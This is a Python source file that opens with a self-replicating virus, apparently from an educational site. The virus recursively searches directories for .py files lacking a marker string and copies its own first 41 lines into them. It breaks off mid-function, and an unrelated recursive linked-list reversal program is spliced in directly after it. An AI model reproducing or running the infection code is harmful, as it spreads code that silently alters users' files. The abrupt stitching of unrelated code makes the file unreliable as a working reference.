#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
"""Python3 program to reverse linked list
using recursive method"""

# Linked List Node


class Node:
    def __init__(self, data):
        self.data = data
        self.next = None

# Create and Handle list operations


class LinkedList:
    def __init__(self):
        self.head = None  # Head of list

    # Method to reverse the list
    def reverse(self, head):

        # If head is empty or has reached the list end
        if head is None or head.next is None:
            return head

        # Reverse the rest list
        rest = self.reverse(head.next)

        # Put first element at the end
        head.next.next = head
        head.next = None

        # Fix the header pointer
        return rest

    # Returns the linked list in display format
    def __str__(self):
        linkedListStr = ""
        temp = self.head
        while temp:
            linkedListStr = (linkedListStr +
                             str(temp.data) + " ")
            temp = temp.next
        return linkedListStr

    # Pushes new data to the head of the list
    def push(self, data):
        temp = Node(data)
        temp.next = self.head
        self.head = temp


# Driver code
linkedList = LinkedList()
linkedList.push(20)
linkedList.push(4)
linkedList.push(15)
linkedList.push(85)

print("Given linked list")
print(linkedList)

linkedList.head = linkedList.reverse(linkedList.head)

print("Reversed linked list")
print(linkedList)

# This code is contributed by Debidutta Rath
# Time Complexity: O(n)
# Space Complexity: O(n)